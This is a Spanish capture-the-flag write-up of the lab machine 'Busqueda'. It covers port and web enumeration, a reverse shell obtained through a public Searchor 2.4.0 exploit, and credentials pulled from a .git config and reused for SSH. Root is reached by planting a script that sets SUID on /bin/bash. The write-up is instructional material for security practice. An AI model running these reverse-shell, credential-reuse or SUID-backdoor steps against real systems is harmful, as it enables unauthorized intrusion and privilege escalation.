# Resolución maquina busqueda

**Autor:** PepeMaquina  
**Fecha:** 11 de octubre de 2025  
**Dificultad:** Easy  
**Sistema Operativo:** Linux  
**Tags:** CVE, enumeration, script

---
## Imagen de la Máquina
![](busqueda.JPG)
*Imagen: busqueda.JPG*

## Reconocimiento Inicial

### Escaneo de Puertos
Comenzamos con un escaneo completo de nmap para identificar servicios expuestos:
~~~ bash
sudo nmap -p- --open -sS -vvv --min-rate 5000 -n -Pn 10.10.11.208 -oG networked
~~~
Luego queda realizar un escaneo detallado de puertos abiertos:
~~~ bash
sudo nmap -sCV -p22,80 10.10.11.208 -oN targeted
~~~
### Enumeración de Servicios
~~~ 
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
|_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
80/tcp open   http     Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://searcher.htb/
Service Info: Host: searcher.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~
### Enumeracion de nombre del dominio
En la enumeración por nmap, se pudo ver que la página redirige a un nombre de dominio que es "searcher.htb", asi que de una vez se lo agrega al famoso /etc/hosts
~~~bash
cat /etc/hosts                         
127.0.0.1       localhost
<SNIP>
10.10.11.208 searcher.htb
~~~
Con esto aprovechamos para hacer reconocimiento de las tecnologias:
~~~ bash
whatweb http://searcher.htb                                                                                                                 
http://searcher.htb [200 OK] Bootstrap[4.1.3], Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/2.1.2 Python/3.10.6], IP[10.10.11.208], JQuery[3.2.1], Python[3.10.6], Script, Title[Searcher], Werkzeug[2.1.2]
~~~
### Enumeración dentro de la pagina web
Algo que siempre hago en todas las paginas web que veo, es un reconocimiento tanto de directorios como de subdominios, para ver si encuentro algo, y lo dejo corriendo hasta el final
~~~ bash
feroxbuster -u http://searcher.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -d 0 -t 5 -o fuzz -k -x php

wfuzz -u http://10.10.11.208 -H "Host:FUZZ.searcher.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --hl 7
~~~
Mientras se deja enumerar directorios y subdominios, se reviso la página web, en la enumeración de la misma de ve que esta hecho en flask (python) y usa una aplicación prediseñada "Searchor 2.4.0".
### CVE-43364
Al buscar alguna vulnerabilidad para dicha versión, se pudo encontrar una exploit en github que muestra una PoC, esta se basa en la forma en que la aplicación construye el enlace que se coloca, de manera que se puede generar una reverse shell (https://github.com/jonnyzar/POC-Searchor-2.4.2).
Realmente el github lo explica bastante bien asi que directamente con acceso a la shell de la maquina objetivo.
~~~bash
sudo nc -nlvp 80  
listening on [any] 80 ...
connect to [10.10.x.x] from (UNKNOWN) [10.10.11.208] 45092
/bin/sh: 0: can't access tty; job control turned off
$ id  
uid=1000(svc) gid=1000(svc) groups=1000(svc)
~~~

---
## User Flag

> **Valor de la Flag:** `<Averiguelo usted mismo>`
### User Flag
Con esto ya se puede ver la user flag
~~~
svc@busqueda:/var/www/app/templates$ cd 
svc@busqueda:~$ ls
user.txt
svc@busqueda:~$ cat user.txt
<Encuentre su propia usre flag>
~~~

---
## Escalada de Privilegios
Para la escalada de privilegios y usar el comando "sudo -l" pide una contraseña, por lo que realizando una busqueda exhaustiva, se encontró unas credenciales y ademas un subdominio gitea.
~~~
svc@busqueda:/var/www/app/.git$ cat config 
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[remote "origin"]
        url = http://cody:jh<SNIP>92@gitea.searcher.htb/cody/Searcher_site.git
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
        remote = origin
        merge = refs/heads/main

~~~
Añadiendo el subdominio y probando las credenciales en gitea son existosas, pero no se encuentra ningun tipo de proyecto que otorgue algun tipo de información.
Asi que probando las credenciales para ingresar por ssh se ve que tambien es exitosa.
~~~bash
ssh svc@10.10.11.208
The authenticity of host '10.10.11.208 (10.10.11.208)' can't be established.
ED25519 key fingerprint is SHA256:LJb8mGFiqKYQw3uev+b/ScrLuI4Fw7jxHJAoaLVPJLA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.208' (ED25519) to the list of known hosts.
svc@10.10.11.208's password: 
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-69-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Oct 12 02:08:25 AM UTC 2025

  System load:                      0.11328125
  Usage of /:                       80.3% of 8.26GB
  Memory usage:                     59%
  Swap usage:                       4%
  Processes:                        237
  Users logged in:                  0
  IPv4 address for br-c954bf22b8b2: 172.20.0.1
  IPv4 address for br-cbf2c5ce8e95: 172.19.0.1
  IPv4 address for br-fba5a3e31476: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.10.11.208
  IPv6 address for eth0:            dead:beef::250:56ff:fe94:8749


 * Introducing Expanded Security Maintenance for Applications.
   Receive updates to over 25,000 software packages with your
   Ubuntu Pro subscription. Free for personal use.

     https://ubuntu.com/pro

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Apr  4 17:02:09 2023 from 10.10.14.19
svc@busqueda:~$
~~~
Con ello ya sabemos que tenemos unas credenciales, asi que probando el comando "sudo -l" se puede ver que se tiene un script con permisos de super usuario.
~~~bash
svc@busqueda:~$ sudo -l
[sudo] password for svc: 
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
~~~
Probando estos comandos para ver su funcionamiento se puede ver que tiene contenedores docker y distintas opciones en su interior-
~~~bash
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup
~~~
Para entender mejor se opto por ir a su carpeta para ver que archivos mas podria tener que puedan ayudar a entender mejor el script.
Una vez dentro, se puede ver que tiene un archivo con el mismo nombre que una opcion del script maestro.
~~~bash
svc@busqueda:/tmp$ cd /opt/scripts/
svc@busqueda:/opt/scripts$ ls
check-ports.py  full-checkup.sh  install-flask.sh  system-checkup.py
~~~
Realizando suposiciones en mi cabeza, parece que utiliza ese archivo para generar alguna acción con el script original, asi que con prueba y error se crea un archivo malicioso, para ello voy a la carpeta /tmp y creo un archivo para dar permisos suid a la bash y hacer el archivo ejecutable.
~~~bash
cat full-checkup.sh 
#!/bin/bash
chmod u+s /bin/bash

chmod +x full-checkup.sh
~~~
Entonces al ejecutar el script en teoria deberia de otorgar permisos suid a la bash.
~~~bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup

[+] Done!
~~~
Ahora revisando la /bin/bash se puede ver que si tiene permisos suid, por lo que el ataque funciono correctamente.
~~~bash
svc@busqueda:/tmp$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1396520 Jan  6  2022 /bin/bash
~~~

---
## Root Flag

> **Valor de la Flag:** `<Averiguelo usted mismo>`

Ahora entrando con acceso a root, se puede obtener la root flag facilmente y completar la maquina.
~~~bash
svc@busqueda:/tmp$ /bin/bash -p
bash-5.1# id
uid=1000(svc) gid=1000(svc) euid=0(root) groups=1000(svc)
bash-5.1# cat /root/root.txt
<Encuentre su propia root flag>
~~~
De esa forma, se logro obtener la root flag.
🎉 Sistema completamente comprometido - Root obtenido

